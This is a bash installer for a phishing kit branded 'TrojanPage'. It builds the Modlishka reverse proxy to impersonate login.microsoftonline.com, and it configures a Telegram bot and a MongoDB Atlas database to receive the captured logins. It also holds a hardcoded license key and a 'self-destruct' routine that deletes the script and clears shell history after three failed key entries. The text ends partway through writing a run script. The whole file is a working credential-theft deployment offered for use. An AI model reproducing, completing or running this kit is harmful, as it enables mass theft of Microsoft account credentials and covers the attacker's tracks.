#!/bin/bash
# 🏛️ TROJANPAGE - MASTER KEY EDITION (GLOBAL)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER FUNCTION ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. MASTER KEY SETTINGS ---
# Change this to your desired universal password
MASTER_KEY="TROJAN-PRO-2026"
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

# --- 3. THE 3-STRIKE SENTRY ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Unauthorized. Enter the Master Activation Key to proceed.${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    if [ $ATTEMPTS -gt 0 ]; then
        echo -e "${RED}[warning] Attempt $((ATTEMPTS)) of 3 failed. Self-destruct in $((3 - ATTEMPTS)) strikes.${NC}"
    fi

    read -p "ENTER MASTER KEY: " USER_INPUT
    # Clean input: remove spaces and make uppercase
    CLEAN_INPUT=$(echo -n "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')

    if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
        echo -e "${GREEN}[success] Access Granted. Loading Setup Wizard...${NC}"
        sleep 1
        break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        sleep 1
    fi

    if [ $ATTEMPTS -eq 3 ]; then
        echo -e "${RED}[critical] Brute-force detected. Self-destructing...${NC}"
        rm -- "$0"
        history -c
        clear
        exit 1
    fi
done

# --- 4. VERIFIED SETUP WIZARD (Runs ONLY after Activation) ---
echo -e "\n${BLUE}--- CONFIGURATION SETUP (VERIFIED) ---${NC}"
sudo apt update && sudo apt install -y curl mongodb-clients golang-go git make screen php-cli unzip > /dev/null 2>&1

# TELEGRAM CHECK
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN}[+] Token Valid${NC}"; break
    else
        echo -e "${RED}[!] Invalid Token. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# CLOUDFLARE CHECK
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "${GREEN}[+] Token Valid${NC}"; break
    else
        echo -e "${RED}[!] Invalid Token. Try again.${NC}"
    fi
done

# MONGODB ATLAS CHECK
while true; do
    read -p "Enter MongoDB Host (Cluster URL): " M_HOST
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Testing Atlas Connection..."
    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} CONNECTED${NC}"; break
    else
        echo -e "${RED} FAILED. Check Host/User/Pass.${NC}"
    fi
done

read -p "Enter Your Domain: " USER_DOMAIN

# --- 5. ENGINE DEPLOYMENT ---
echo -e "${BLUE}[+] Compiling Trojan Engine...${NC}"
cd /root
if [ ! -d "engine" ]; then
    git clone https://github.com/drk1wi/Modlishka.git engine > /dev/null 2>&1
    cd engine && make > /dev/null 2>&1 && cd ..
fi

cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
}
EOF

# --- 6. CREATE THE PERMANENT RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
# MASTER KEY LOGIC FOR RUN SCRIPT
MASTER_KEY="TROJAN-PRO-2026"
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
